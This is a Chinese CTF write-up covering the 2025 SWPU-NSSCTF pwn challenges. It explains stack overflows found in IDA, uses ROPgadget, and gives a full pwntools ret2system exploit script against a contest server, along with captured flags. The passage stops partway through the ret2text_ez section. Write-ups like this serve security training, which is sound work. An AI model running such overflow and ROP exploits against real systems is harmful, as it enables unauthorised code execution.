---
title: 2025-SWPU-NSSCTF(Pwn全)
url: https://mp.weixin.qq.com/s/7C5Hw706SvqycWBR2tkGag
source: Doonsec's feed
date: 2026-04-21
fetch_date: 2026-04-22T04:40:42.912784
---

# 2025-SWPU-NSSCTF(Pwn全)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YdkQKXYKSBhRwFZk0v7uiaggc6ED5jnfe7JcXk5LiaAssscibdWZy0NI63g9eZxjcBGlGqTEbTNCxaVddETia0avbwm5cO1T7kCNlaetFibW7Sc4/0?wx_fmt=jpeg)

# 2025-SWPU-NSSCTF(Pwn全)

玫幽倩
玫幽倩

玫家大院

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

前边很大一部分是我很久以前刚刚学的时候写的，想想也要有8、9个月以前了，前边很多题可能解法比较复杂或者写的烂也是因为这个（）

最近翻出来发现之前不会的一直尬在那里没去补，所以就想着补完发一份了

当时作为新人打这个比赛其实打的还是很开心的，当时的ai也没那么发达，一做就是一天

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgibUcZfTbVYb0M7hpUkHiaVSBiaNrVLulOCEnYq151oqUN6g0vpu9tzbU6fCKiaVfwkvY1AvFHlyv9uiagUOiaCE00OX6OrXBqR75ps/640?wx_fmt=png&from=appmsg "null")

# pwn

## Does your nc work?

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBiaPom2jviaTHVQpe1uNoiadEPFdsiaWMR38IH43I8teXnZNgY6HiaMYVEvIOvhwMdElGyYLEcqhWE2494LSamLAaYm3cXhVGmy3TTM/640?wx_fmt=png&from=appmsg "null")

直接虚拟机nc node5.anna.nssctf.cn 25196

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaqpugcKmibNicYtKGHGO9w5eFNUXkZohpR36DiaiaksbXDkTsJJLhStM8XXTQsokDibbkQPfdExT9yPUy2BpBwXRMiagpId8PqDUuFs/640?wx_fmt=png&from=appmsg "null")

这边我们先进入根目录，ls列一下，发现有个nss，那我想cat一下，结果不是

那继续cd进去nss目录，看见ctf想继续cat，结果又不是

最后打开ctf目录才是，答案为NSSCTF{4e2ebb16-becf-492a-a3cb-208e5d458076}

## gift\_pwn

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBg1d0NBemm9uKLEZYrmL1dtiaYoEiaXyl4BHgyBfNghUuNKML6BT5PQSNoCfjYGpUMBicRibaOdwO6oA2YYIA4kibKGNicia7vkAYclY8/640?wx_fmt=png&from=appmsg "null")

nc node4.anna.nssctf.cn 28348

输入虚拟机然后就没动静了，那没办法只能开ida看看了

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjWXAGb38guz9hHkGwxaN4lLuzf76Ruq37xeFJ7epIyJBHTArEUnaYyKx4XibiciapIWh1pUwibn6RNNYsvu6QwbjQ3lFfU5uxK06o/640?wx_fmt=png&from=appmsg "null")

可以看到这边vuln存在有栈溢出的漏洞，因为显然buf只能存储16字节的数据，但是read函数允许读取100个字节以内的数据，因此很容易栈溢出。我们可以通过溢出的部分来执行任意代码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBia3sUGG48JSX27bPVLV1vFHpUggDstb7ez38W2pyKgtcNUe7DLmqLica9fgGHJghJg4FgpTHCdSKiarXVDTktB8wVvp2DQap7akI/640?wx_fmt=png&from=appmsg "null")

这边可以看到还有/bin/sh，点开来看看

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBh2E01tIe4rE3vjnTCkCeicL1qa0EhhSBFmJnYpztnFgBkhbecpHqUEc4cMelgBgoxQG4z4yax3kd9HwKzQcslOCULIKOOz47yM/640?wx_fmt=png&from=appmsg "null")

这边可以看到/bin/sh开始于4005B6

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaGX6e5Fpf50OXaDG9fbYqlz18Thu4QbiaZ37uhw4eVXrUDLF5W9kibibdUz21j2eFBelnv8d8Yicxhf5ejGfmgV43Ut2CCic6ptVKo/640?wx_fmt=png&from=appmsg "null")

所以构造这样子的payload即可

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhh9CtfqHh24q6xYetI2WQkJIopYibqoEEibjiauHjUa0TfLSUN9wicAmG8ia8XVZ4ctV1wBF9tdJ9JIdMUZyBWMHyRmbF4yJC4oQlk/640?wx_fmt=png&from=appmsg "null")![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBia1U7W3A9uvf7RQdpxoRIDOdo6wiagI1Jd6PuJVpOQInWsvN1BuhEMDPiaiaZwUpfRA9MKDSH3RVrE9lJEANTCyETHf8nbibPH1K8I/640?wx_fmt=png&from=appmsg "null")

直接ls发现flag然后cat即可

NSSCTF{2ef7ead1-9abc-4d8e-bce4-87ecfebe3453}

## 口算题卡

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhHzmvsibUF1TYxoF8DLEmbQEPib2zQG2R6pan8PX9JMbBTr8dNyQtibS84L1BsMibbt1kvJzSiazvWa1LbH1ldcZwnl2diaIiabBF0tw/640?wx_fmt=png&from=appmsg "null")

这网站登不上，只能nc了nc node4.anna.nssctf.cn 28790

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBj5wskfcwy3VJkIemGfY6Q9yRw78VLtzvZ3VxmpG5iaxvhgBMd3RVTfgdH8OJSTkWb8ic3gwrZjk1AVPJRenRfqBerWMplliab5bI/640?wx_fmt=png&from=appmsg "null")

做了几道发现没啥用，再做几道试试看

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBh4libw0JaiajcibrBZ0A3W9C99icBUEZwib8gVrfuZsdTTY34ibaSEnOdcZBq8xZV14zib7eCyw8dKmnTZPJsgvc2SBkia7gu7oNGWvvg/640?wx_fmt=png&from=appmsg "null")

怪好玩的，但这样子不知道什么时候是个头，必须写一个代码循环完成计算工作，直到出现答案

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBga6YHyANXwqfUWVEIk6Riaxyr2hGV6g0keAWD4M5vWPxq2eicdCsHZ4vxCt8CBWEzjnLa73Gz8P3935Kxib4YXibczn9sjSMAicBdc/640?wx_fmt=png&from=appmsg "null")

每行自动计算，最后得到如下结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiazjqKZliahWpPia7cRKcUd7svdIz7qDbuOVl5Jib2uorVD7VcsMIcorv5UvfqCJc6olarExr96zwLMr6dibYJbth8bjyJsfhm8HtU/640?wx_fmt=png&from=appmsg "null")

答案如上

## Where\_is\_shell

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjibNKSzuWl2k15JAVPolBSe2LnoLPpicZZZX514JiaWxlUKibTEv7ykAlzX9H6XOuZ6svVvCxlHO5BVibkd7f4rCudPJ1sZwQc9JDY/640?wx_fmt=png&from=appmsg "null")

保护：

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhG4J6soRicgHVibeOx0NS5qVvFRicLWica4DLjmfMFMMC3MC1vkic7aTEeq4iblsg94Tg5uF6GPDkSqUUR3B4wsicZFLyiaxLXCAflCe0/640?wx_fmt=png&from=appmsg "null")

先die看看

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhEs0LicscKxuYiaCtyqKEE7flJbbeZOCjNPsRztVLP77OVoW43phYmA9ZvVrSyZFwXYDJ6l8SC4F8Me1ZCO4Le8aztic7jLFCbp0/640?wx_fmt=png&from=appmsg "null")

64位Linux，注意payload用p64封装

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBh5RgDzicN1rSQHMTNVwTWlwbuweLc05iakkKqnfzKJbYc2CDbHqODicNlZo8mfRZeJBubCQvAiaqE3f738EP2UC8n3WianwYLj5JmI/640?wx_fmt=png&from=appmsg "null")

这边可以看到这个read函数能写56个

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhmhWMmicC4wjj7dHcSBdpvxgPMtcs8JwgJ6QyofWyH22GGobeOwBrsg3arFiapWAaOpiaJl2aTsNMh4a4nibuJNicEsLck3iaKM1XnI/640?wx_fmt=png&from=appmsg "null")

但是buf搞0x10+8就溢出了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhx1MeuShYeyjBPa8S2bx5NytjPymia6uMWcrgPMtWB389A7v3R8BF1Rg30FBqPUVvNyq42lRo7BZHd8JLxIlicQz0uKtEhYIqo0/640?wx_fmt=png&from=appmsg "null")

我们搞这个64位传参

这边可以看到我们system的参数是不对的，我们需要用pop把bin\_sh给弹到rdi里，然后system这个bin\_sh
这边我们需要这个rdi和ret的地址，我们利用代码

ROPgadget --binary "shell" --only "pop|ret"

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBiaJUQPXygThZTLe3via9fcyQrFos5iaPc3vEgI4RGwiawPeTcg9NO1BnyqjdCXCUgwW49GcZdI2OPwH2bz508vePBwAt1NtwSK1IY/640?wx_fmt=png&from=appmsg "null")

这边即可得到

rdi = 0x04005e3

ret = 0x0400416

接下来传参给system即可

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBg0Feic7uNYjQOKm0b7BUzS9BW6MBvEP0Y7ergSZC7Uww2A3dyictqEPm630eicJXTt65BNbnHKGkZWXfRz4MfricibBqibZKr8T8CgU/640?wx_fmt=png&from=appmsg "null")

哦？没有/bin/sh啊，但是保护开了NX，我们用不了shellcode

但是搜sh是可以搜到的（也是正好sh可以指向这个/bin/sh）

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBgOwHGkNapblfAeBwZwjdXHc4VUNEFWHW39MuAbvrvpvVPib261sicW2wJqQpSKty2SiaC98fa1ibRhvjt78dWn23yQL4ibNh1g6oFc/640?wx_fmt=png&from=appmsg "null")

next，所以sh的地址不是0x400540，而是0x400541，这应该是唯一的难点了

后边就传参就是了，注意题目和64位需要ret栈对齐

```
from pwn import *
context.log_level = "debug"
io=remote("node4.anna.nssctf.cn",28447)

padding=0x10+8
rdi = 0x04005e3
ret = 0x0400416
system = 0x400430
sh = 0x400541

payload = b"a"*padding +p64(rdi)+p64(sh)+p64(ret)+p64(system)
io.sendline(payload)

io.interactive()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaticKqI60J6m5OE9XbD6xWht4uGqeQf9kZOeE9Lia5n1lpGcBTkZaHHYHKCnPlbUCDrzM2yPWzh73bM70HNLNVicr2gXIrz23Q5A/640?wx_fmt=png&from=appmsg "null")

NSSCTF{649095a2-cd59-4c3d-b7d8-0ee0f1f70378}

## shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBjHZh5lVkTKNuqHOO6o5Hs1SSxRDCMUKM6tdPcu7BJYTU7bDGLk8aqzNibPS3q6C67tdzKADgoQZgChGZlhPPOh5pA7KnlTEXqY/640?wx_fmt=png&from=appmsg "null")

？？没附件？

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBia4KQ0XN9OnTpiaHEibud3Lma9DaukVJicytwXMDU3z7Qqico4CNH68vIunvBJEsWCYWO9yOfWFy58ZkPBnF5CtMf3gWLt3jhNKHY8/640?wx_fmt=png&from=appmsg "null")

额，这是。。？这。签到题吧，怎么会比刚那题做的人少啊？这都没难度啊

NSSCTF{64a18987-9d10-4bf1-81d0-a5d2a6a74d80}

## ret2text\_ez

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBgx1Bl4A9BtMdbNgeXa1HOUDIoBHWHdyNSOTibVV4bu2gHawyBZ1LdYT2tPz6gYZ4EUkzBPrSy8AshW5cvJHkw47RdKbejyyfuA/640?wx_fmt=png&from=appmsg "null")

保护

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhkSwWun1VCE3HLLXxIicEJdcnqRdKo5ibEHCmLCE0CmZKQEIzFJlqqbyX9mnQydvrCjnLksMCckBomGZDdfUsaG0iasHEqGqic7CY/640?wx_fmt=png&from=appmsg "null")![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBiaVsNPOyz5FQiaL8SpibSxdGzSFWNuFKctM7QeYc4QhWGSZSznRw17reibexK90edQDCc4K1XcEKudZQTbicyx9CLwPOKlAqwPfAFs/640?wx_fmt=png&from=appmsg "null")

64位

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgGKPEmWibLKZbGsLb8DQbj7YqPiaSV3jLW0SMH7cA86qKJettOgL846z0rbYVMewj8drscMtb9CzJjyeWQWK7Xt1zTzOHvvTd04/640?wx_fmt=png&from=appmsg "null")

在vuln函数可以找到漏洞点

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBgTEzK2NxW0py5uzE8rPTlZB0icCibaBzeibQmZshXlnmj4jhBWslWmRPIZN84BOEob2kVNbOs5gUJ5hl2hIh480ylKGZxKibUKPSs/640?wx_fmt=png&from=appmsg "null")

0x20+8溢出

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaxvStpw5kib8suhiaHPAQ1EB5fVDGAnCAoBgAvXqIicaymQKUu...